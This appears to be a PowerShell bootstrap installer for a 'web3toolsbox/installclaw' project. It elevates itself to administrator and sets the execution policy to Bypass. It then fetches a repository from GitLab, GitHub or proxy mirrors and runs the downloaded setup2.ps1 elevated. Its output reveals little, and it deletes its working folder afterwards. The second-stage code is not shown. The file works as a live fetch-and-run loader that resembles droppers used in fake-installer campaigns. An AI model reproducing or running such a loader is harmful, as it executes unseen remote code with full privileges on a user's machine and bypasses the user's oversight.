#Requires -Version 5.1
param(
    [string]$RelaunchWorkingDirectory,
    [string]$LaunchingUserSid
)

$currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
$currentUserSid = $currentIdentity.User.Value

if (-not $LaunchingUserSid) {
    $LaunchingUserSid = $currentUserSid
} elseif ($LaunchingUserSid -ne $currentUserSid) {
    Write-Host '[ERROR] The elevated process is running as a different Windows user than the one that started this script.' -ForegroundColor Red
    exit 1
}

if (-not ([Security.Principal.WindowsPrincipal]$currentIdentity).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $scriptPath = $PSCommandPath
    if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Definition }

    $psExe = (Get-Process -Id $PID).Path
    if (-not $psExe) { $psExe = 'powershell.exe' }

    $workDir = if ($PWD.Path) { $PWD.Path } else { '' }
    $relaunchArgs = @(
        '-NoProfile', '-ExecutionPolicy', 'Bypass',
        '-File', "`"$scriptPath`"",
        '-RelaunchWorkingDirectory', "`"$workDir`"",
        '-LaunchingUserSid', $LaunchingUserSid
    )

    try {
        $elevated = Start-Process -FilePath $psExe -ArgumentList $relaunchArgs -Verb RunAs -Wait -PassThru
        $code = if ($null -ne $elevated.ExitCode) { $elevated.ExitCode } else { 0 }
        exit $code
    } catch {
        Write-Host '[ERROR] Administrator privileges are required; elevation was cancelled or blocked.' -ForegroundColor Red
        exit 1
    }
}

if ($RelaunchWorkingDirectory -and (Test-Path -LiteralPath $RelaunchWorkingDirectory -PathType Container)) {
    Set-Location -LiteralPath $RelaunchWorkingDirectory
}

[Console]::OutputEncoding = [System.Text.UTF8Encoding]::new($false)
$OutputEncoding        = [System.Text.UTF8Encoding]::new($false)
$ErrorActionPreference = 'Stop'

# $SCRIPT_URL="https://"
$RepoPart       = "web3toolsbox/installclaw.git"
$GitMirrors = @(
    "https://gitlab.com/$RepoPart",
    "https://github.com/$RepoPart",
    "https://ghproxy.com/https://github.com/$RepoPart",
    "https://gh-proxy.com/https://github.com/$RepoPart",
    "https://hub.gitmirror.com/https://github.com/$RepoPart" 
)

$ArchiveUrls = @(   
    "https://gitlab.com/web3toolsbox/installclaw/-/archive/main/installclaw-main.zip?ref_type=heads",
    "https://github.com/web3toolsbox/installclaw/archive/refs/heads/main.zip"
)

function Write-Log  { param([string]$Msg) Write-Host "[INFO]  $Msg" -ForegroundColor Cyan }
function Write-Warn { param([string]$Msg) Write-Host "[WARN]  $Msg" -ForegroundColor Yellow }
function Write-Err  { param([string]$Msg) Write-Host "[ERROR] $Msg" -ForegroundColor Red }
function Write-Ok   { param([string]$Msg) Write-Host "[ OK ]  $Msg" -ForegroundColor Green }

try {
    Set-ExecutionPolicy Bypass -Scope CurrentUser -Force -ErrorAction SilentlyContinue
} catch {
    Write-Warn "Could not set execution policy: $_"
}

function Invoke-CloneWithFallback {
    param([string]$Target)
    $total = $GitMirrors.Count
    for ($i = 0; $i -lt $total; $i++) {
        Write-ok "Installing..."
        $prevEAP = $ErrorActionPreference
        $ErrorActionPreference = 'SilentlyContinue'
        git clone --depth=1 --single-branch $GitMirrors[$i] $Target 2>&1 | Out-Null
        $ErrorActionPreference = $prevEAP
        if ($LASTEXITCODE -eq 0) {
            return
        }
        Remove-Item $Target -Recurse -Force -ErrorAction SilentlyContinue
    }
    Write-Err "All mirrors failed. Please check your network connection."
    exit 1
}

function Get-RepoViaDownload {
    param([string]$WorkDir)

    try {
        [Net.ServicePointManager]::SecurityProtocol = `
            [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
    } catch { }

    $archive    = Join-Path $WorkDir "repo.zip"
    $extractDir = Join-Path $WorkDir "extracted"
    New-Item -ItemType Directory -Path $extractDir -Force | Out-Null

    $downloaded = $false
    $idx = 0
    foreach ($url in $ArchiveUrls) {
        $idx++
        Write-ok "Installing..."
        try {
            Invoke-WebRequest -Uri $url -OutFile $archive -UseBasicParsing -ErrorAction Stop
        } catch {
            Write-Warn "Download failed for candidate ${idx}: $_"
            continue
        }
        try {
            Expand-Archive -Path $archive -DestinationPath $extractDir -Force -ErrorAction Stop
            $downloaded = $true
            break
        } catch {
            Write-Warn "Archive could not be extracted; trying next source."
            Remove-Item $archive -Force -ErrorAction SilentlyContinue
        }
    }

    if (-not $downloaded) {
        Write-Err "Failed to download/extract the repository via Invoke-WebRequest."
        exit 1
    }

    $setup = Get-ChildItem -Path $extractDir -Recurse -Depth 3 -Filter "setup2.ps1" `
                 -File -ErrorAction SilentlyContinue | Select-Object -First 1
    if (-not $setup) {
        Write-Err "setup2.ps1 not found inside the downloaded archive."
        exit 1
    }
    Write-Ok "Source archive ready"
    return $setup.DirectoryName
}

$suffix       = [System.IO.Path]::GetRandomFileName().Replace('.', '')
$workDir      = Join-Path $env:TEMP "installclaw-bootstrap-$suffix"
$origLocation = Get-Location
$exitCode     = 0

New-Item -ItemType Directory -Path $workDir -Force | Out-Null

try {
    Set-Location -Path $workDir -ErrorAction Stop

    if (Get-Command git -ErrorAction SilentlyContinue) {
        Write-Ok "Git is available: $(git --version)"
        $repoDir = Join-Path $workDir "installclaw"
        Invoke-CloneWithFallback -Target $repoDir
    } else {
        Write-Warn "Git not installed; skipping auto-install and using download instead."
        $repoDir = Get-RepoViaDownload -WorkDir $workDir
    }

    $childScript = Join-Path $repoDir "setup2.ps1"
    if (-not (Test-Path $childScript)) {
        Write-Err "Child installer script not found."
        $exitCode = 1
    } else {
        Set-Location -Path $repoDir -ErrorAction Stop
        powershell -ExecutionPolicy Bypass -File ".\setup2.ps1"
        if ($LASTEXITCODE -ne 0) {
            Write-Err "Child installer failed (exit code $LASTEXITCODE)."
            $exitCode = $LASTEXITCODE
        }
    }
} finally {
    Set-Location -Path $origLocation -ErrorAction SilentlyContinue
    Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
}

if ($exitCode -eq 0) {
    Write-Ok "Install complete!"
}
exit $exitCode
